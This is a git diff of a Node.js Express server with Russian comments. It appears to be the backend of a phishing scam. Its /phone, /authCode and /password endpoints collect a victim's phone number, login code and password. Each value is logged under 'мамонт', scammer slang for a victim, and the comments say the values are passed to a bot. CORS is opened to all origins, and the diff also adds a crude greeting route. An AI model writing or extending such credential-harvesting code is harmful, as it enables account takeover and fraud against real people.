@@ -16,33 +16,25 @@ const cors = require('cors');
 //     }
 //   });
 
-
 app.use(express.json());
 
-app.use(cors({
-    origin: '*',
-    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
-    credentials: true,
-    optionsSuccessStatus: 204,
-    allowedHeaders: ['Content-Type', 'Authorization'],
-}));
+// Разрешаем CORS для всех доменов
+app.use(cors());
 
 var pn;
 var code;
 var pass;
+
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
-        // Обнуление переменной после отправки в бот
-        pn = undefined;
-        return;
+        pn = undefined; // Обнуление переменной после отправки в бот
     } else {
         console.log('Номер телефона мамонта неопределен.');
         res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
-        return;
     }
 });
 
@@ -52,13 +44,10 @@ app.post('/authCode', (req, res) => {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        // Обнуление переменной после отправки в бот
-        code = undefined;
-        return;
+        code = undefined; // Обнуление переменной после отправки в бот
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return;
     }
 });
 
@@ -68,13 +57,18 @@ app.post('/password', (req, res) => {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
-        // Обнуление переменной после отправки в бот
-        pass = undefined;
-        return;
+        pass = undefined; // Обнуление переменной после отправки в бот
     } else {
         console.log('Пароль мамонта неопределен.');
         res.status(400).json({ error: 'Пароль мамонта неопределен.' });
-        return;
     }
+});
+
+app.get('/', (req, res) => {
+    res.send('Salam Alejkum, Denis Penis!');
+});
+
+app.listen(port, () => {
+    console.log(`Сервер запущен на порту ${port}`);
 });
 
